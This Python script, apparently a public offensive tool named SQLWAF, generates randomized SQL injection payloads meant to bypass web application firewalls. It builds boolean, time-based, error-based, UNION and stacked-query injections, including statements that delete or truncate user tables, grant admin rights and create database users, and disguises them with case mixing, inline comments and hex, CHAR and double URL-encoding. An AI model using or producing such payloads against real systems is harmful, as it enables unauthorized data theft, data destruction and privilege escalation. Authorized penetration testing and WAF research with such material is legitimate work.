#!/usr/bin/env python3
import random,string,urllib.parse,base64,re,sys,os,argparse,time,hashlib,json
from datetime import datetime as dt
class C:H,B,C,G,R,E,D='\033[95m','\033[94m','\033[96m','\033[92m','\033[91m','\033[0m','\033[1m'
def b():return f"""{C.R}
███████╗ ██████╗ ██╗     ██╗    ██╗ █████╗ ███████╗
██╔════╝██╔═══██╗██║     ██║    ██║██╔══██╗██╔════╝
███████╗██║   ██║██║     ██║ █╗ ██║███████║█████╗  
╚════██║██║▄▄ ██║██║     ██║███╗██║██╔══██║██╔══╝  
███████║╚██████╔╝███████╗╚███╔███╔╝██║  ██║██║     
╚══════╝ ╚══▀▀═╝ ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     
{C.B}[ SQL Injection Payload Generator & WAF Bypass ]{C.E}
{C.C}[ Created by: @davicruz1337 - Version 2.1.0 ]{C.E}"""
class X:
    def __init__(s):
        s.a={'s':['SeLeCt','/*!50000SELECT*/','SELECT','/*!12345SELECT*/','(SELECT)','%53%45%4c%45%43%54'],'u':['UNIoN','/*!50000UnIoN*/','/*!12345UNION*/','%55%4E%49%4F%4E'],'w':['WhErE','/*!50000WHERE*/','/*!12345WHERE*/'],'f':['FrOm','/*!50000FROM*/','/*!12345FROM*/'],'n':['NuLl','/*!50000NULL*/','/*!12345NULL*/']}
        s.b=[' ','/**/','%20','+','%0a','%0b','%0c','%0d','%09','%0e','%0f','%a0']
        s.c=['--','#','/*',';--','/*!*/',';#','--+','--+-','/*--*/','//','\\',';%00']
        s.d=['=','LIKE','IN','REGEXP','RLIKE','SOUNDS','<=>','>=','<=','!=','<>','~','!~','^=','=*']
        s.e=["'",'"',"`","')","'))",")))","'/**/","'--","'#","`)","%27","%22"]
        s.f=[';','--','#','/*',';%00',';%0a',';%0d%0a',';\n']
        s.g=['@@version','database()','user()','@@hostname','@@datadir','@@version_compile_os']
        s.h=['CONCAT','GROUP_CONCAT','CONCAT_WS','CHAR','HEX','UNHEX']
        s.i=["'or'1'='1","'or 1=1","') or ('1'='1","') or '1'='1"]
        s.j=['INFORMATION_SCHEMA.TABLES','INFORMATION_SCHEMA.COLUMNS']
class Y:
    def __init__(s):s.x,s.m,s.h=X(),set(),{}
    def _a(s,t):return''.join(random.choice([c.upper(),c.lower()])for c in t)
    def _c(s,t,d=False):return urllib.parse.quote(urllib.parse.quote(t))if d else urllib.parse.quote(t)
    def _b(s,t):return''.join([hex(ord(c))[2:]for c in t])
    def _e(s,t):return''.join(w[:random.randint(1,len(w)-1)]+"/**/"+w[random.randint(1,len(w)-1):]if len(w)>4and random.random()>.6 else w for w in t.split())
    def _f(s,t):return'CHAR('+','.join(str(ord(c))for c in t)+')'
    def a(s):
        t=["{v}{s}AND{s}1={e}1{c}","{v}{s}OR{s}1={e}1{c}","{v}{s}XOR{s}FALSE{c}","{v}{s}AND{s}TRUE{c}","{v}{s}&&{s}1{c}","{v}{s}||{s}1{c}"]+[i for i in s.x.i]
        return s._g(random.choice(t).format(v=random.choice(s.x.e),s=random.choice(s.x.b),e=random.choice(s.x.d),c=random.choice(s.x.c)))
    def b(s):
        d=["SLEEP({t})","BENCHMARK(1000000,SHA1(1))","pg_sleep({t})","WAITFOR DELAY '0:0:{t}'","(SELECT{s}COUNT(*)FROM(SELECT{s}1{s}UNION{s}SELECT{s}2)x)","GeomFromText(SLEEP({t}))","IF(1=1,SLEEP({t}),0)"]
        t="{v}{s}AND{s}{d}{s}{c}"
        return s._g(t.format(v=random.choice(s.x.e),s=random.choice(s.x.b),d=random.choice(d).format(t=random.randint(1,5),s=random.choice(s.x.b)),c=random.choice(s.x.c)))
    def c(s):
        t=["AND{s}extractvalue(1,concat(0x7e,({q}),0x7e))","AND{s}updatexml(1,concat(0x7e,({q}),0x7e),1)","AND{s}JSON_EXTRACTVALUE(1,concat(0x7e,({q}),0x7e))","OR{s}1{s}GROUP{s}BY{s}CONCAT(({q}),0x7e,FLOOR(RAND(0)*2))","AND{s}(SELECT{s}1{s}FROM(SELECT{s}COUNT(*),CONCAT(({q}),FLOOR(RAND(0)*2))x{s}FROM{s}{t}{s}GROUP{s}BY{s}x)a)"]
        return s._g(random.choice(t).format(s=random.choice(s.x.b),q=random.choice(s.x.g),t=random.choice(s.x.j)))
    def d(s):
        c=random.randint(1,15)
        cols=['NULL'if random.random()>.5 else str(i)for i in range(c)]
        f=f"{random.choice(s.x.b)}FROM{random.choice(s.x.b)}{random.choice(['DUAL']+s.x.j)}"if random.random()>.5 else''
        t=["{v}{s}{c}{s}{u}{s}{sel}{s}{cols}{f}","{v}{s}{c}{s}{u}{s}ALL{s}{sel}{s}{cols}{f}"]
        return s._g(random.choice(t).format(v=random.choice(s.x.e),s=random.choice(s.x.b),c=random.choice(s.x.c),u=random.choice(s.x.a['u']),sel=random.choice(s.x.a['s']),cols=','.join(cols),f=f))
    def e(s):
        d=["DELETE{s}FROM{s}users","UPDATE{s}users{s}SET{s}admin=1","INSERT{s}INTO{s}users{s}VALUES('1','1')","TRUNCATE{s}TABLE{s}users","ALTER{s}TABLE{s}users{s}ADD{s}COLUMN{s}x{s}TEXT","CREATE{s}USER{s}'x'@'%'{s}IDENTIFIED{s}BY{s}'x'"]
        return s._g("{v};{s}{stm}{s}{term}".format(v=random.choice(s.x.e),s=random.choice(s.x.b),stm=random.choice(d).format(s=random.choice(s.x.b)),term=random.choice(s.x.f)))
    def _g(s,p):
        fs=[s._a,s._e]+([]if random.random()<.5else[lambda x:s._c(x,True)])+([]if random.random()<.7else[s._b,s._f])
        for f in fs:p=f(p)
        h=hashlib.md5(p.encode()).hexdigest()
        s.h[h]=p
        return p
    def f(s,n=10,t=None):
        if not t:t=['a','b','c','d','e']
        r,g=[],{'a':s.a,'b':s.b,'c':s.c,'d':s.d,'e':s.e}
        while len(r)<n:
            tech=random.choice(t)
            if tech in g:
                p=g[tech]()
                if re.sub(r'\s+',' ',p.lower())not in s.m:
                    s.m.add(re.sub(r'\s+',' ',p.lower()))
                    r.append({'p':p,'t':tech,'l':len(p),'ts':dt.now().strftime('%H:%M:%S'),'h':hashlib.md5(p.encode()).hexdigest()})
        return r
    def save_history(s,file='history.json'):
        with open(file,'w')as f:json.dump(s.h,f)
    def load_history(s,file='history.json'):
        try:
            with open(file)as f:s.h=json.load(f)
        except:pass
def main():
    p=argparse.ArgumentParser(description=f'{C.G}SQLWAF{C.E}');p.add_argument('-n',type=int,default=5);p.add_argument('-t',choices=['a','b','c','d','e','all'],default='all');p.add_argument('-o');p.add_argument('-v',action='store_true');p.add_argument('--no-encode',action='store_true');p.add_argument('--max-length',type=int);p.add_argument('--save-history',action='store_true');p.add_argument('--load-history',action='store_true');a=p.parse_args()
    os.system('cls'if os.name=='nt'else'clear');print(b())
    g=Y()
    if a.load_history:g.load_history()
    start=time.time()
    y=g.f(a.n,['a','b','c','d','e']if a.t=='all'else[a.t])
    if a.max_length:y=[p for p in y if p['l']<=a.max_length]
    if a.o:
        with open(a.o,'w')as f:f.write('\n'.join(p['p']for p in y))
        print(f"\n{C.G}[+] Saved {len(y)} payloads to {a.o}{C.E}")
    if a.save_history:g.save_history()
    print(f"\n{C.D}[+] Generated Payloads:{C.E}")
    for i,p in enumerate(y,1):print(f"\n{C.C}{i}. Type: {p['t']}\n   Length: {p['l']}\n   Time: {p['ts']}\n   Hash: {p['h']}\n   Payload: {p['p']}{C.E}"if a.v else f"\n{C.C}{i}.{C.E} {p['p']}")
    print(f"\n{C.G}[+] Total: {len(y)} | Time: {time.time()-start:.2f}s{C.E}\n")
if __name__=="__main__":
    try:main()
    except KeyboardInterrupt:print(f"\n{C.R}[!] Interrupted{C.E}");sys.exit(1)
    except Exception as e:print(f"\n{C.R}[!] Error: {str(e)}{C.E}");sys.exit(1)
